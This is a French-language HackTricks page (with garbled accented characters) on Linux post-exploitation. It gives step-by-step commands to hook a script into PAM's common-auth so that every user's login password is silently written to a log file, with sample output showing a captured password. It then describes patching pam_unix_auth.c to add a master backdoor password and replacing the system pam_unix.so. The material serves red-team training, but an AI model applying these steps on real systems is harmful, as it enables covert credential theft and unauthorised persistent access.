# Post-Exploitation Linux

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Sniffer les mots de passe de connexion avec PAM

Configurons un module PAM pour enregistrer chaque mot de passe utilis√© par chaque utilisateur lors de la connexion. Si vous ne savez pas ce qu'est PAM, consultez :

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

D'abord, nous cr√©ons un script bash qui sera invoqu√© √† chaque nouvelle authentification.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
```
Les variables sont sp√©cifiques √† PAM et seront disponibles via le module `pam_exec.so`.

Voici la signification des variables :

* **$PAM\_USER :** Le nom d'utilisateur qui a √©t√© entr√©.
* **$PAM\_RHOST :** L'h√¥te distant (typiquement l'adresse IP)
* **$(cat -) :** Ceci lit `stdin`, et contiendra le mot de passe que le script r√©cup√®re
* Les r√©sultats sont redirig√©s dans un fichier journal √† `/var/log/toomanysecrets.log`

Pour **emp√™cher tous les utilisateurs de lire** le fichier, envisagez de le cr√©er au pr√©alable et d'ex√©cuter `chmod`, par exemple :
```bash
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
```
Ensuite, le fichier de configuration PAM doit √™tre mis √† jour, le module `pam_exec` sera utilis√© pour invoquer le script.

Il existe divers fichiers de configuration situ√©s dans `/etc/pam.d/`, et nous choisissons `common-auth`.
```
sudo nano /etc/pam.d/common-auth
```
Ajoutez le module d'authentification suivant tout en bas du fichier :

`auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh`

Les options ont les significations suivantes :

* **optional :** L'authentification ne doit pas √©chouer s'il y a une erreur (ce n'est pas une √©tape obligatoire)
* **pam\_exec.so :** C'est le module PAM "living off the land" qui peut invoquer des scripts arbitraires
* **expose\_authtok :** C'est l'astuce qui permet de lire le mot de passe via `stdin`
* **quiet :** Ne montrez aucune erreur √† l'utilisateur (si quelque chose ne fonctionne pas)
* Le dernier argument est le script shell qui a √©t√© cr√©√© pr√©c√©demment

![](<../../.gitbook/assets/image (375).png>)

Enfin, rendez le fichier ex√©cutable :

`sudo chmod 700 /usr/local/bin/toomanysecrets.sh`

Maintenant, essayons cela et connectons-nous depuis une autre machine, ou localement.

Et ensuite, regardez le fichier journal :
```
$ sudo cat /var/log/toomanysecrets.log
Sun Jun 26 23:36:37 PDT 2022 tom, Trustno1!, From: 192.168.1.149
Sun Jun 26 23:37:53 PDT 2022 tom, Trustno1!, From:
Sun Jun 26 23:39:12 PDT 2022 tom, Trustno1!, From: 192.168.1.149
```
### Contournement de PAM

Allons aux sources de PAM (selon votre distribution, prenez le m√™me num√©ro de version que le v√¥tre..) et regardons autour des lignes 170/180 dans le fichier pam_unix_auth.c :
```
vi modules/pam_unix/pam_unix_auth.c
```
![](<../../.gitbook/assets/image (651).png>)

Changeons cela par :

![](<../../.gitbook/assets/image (638) (2) (2).png>)

Cela permettra √† tout utilisateur utilisant le **mot de passe "0xMitsurugi"** de se connecter.

Recompilez le fichier `pam_unix_auth.c`, et remplacez le fichier pam\_unix.so :
```bash
make
sudo cp \
/home/mitsurugi/PAM/pam_deb/pam-1.1.8/modules/pam_unix/.libs/pam_unix.so \
/lib/x86_64-linux-gnu/security/
```
{% hint style="info" %}
Vous pouvez automatiser ce processus avec [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)
{% endhint %}

## R√©f√©rences

* [https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)
* [https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> !</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
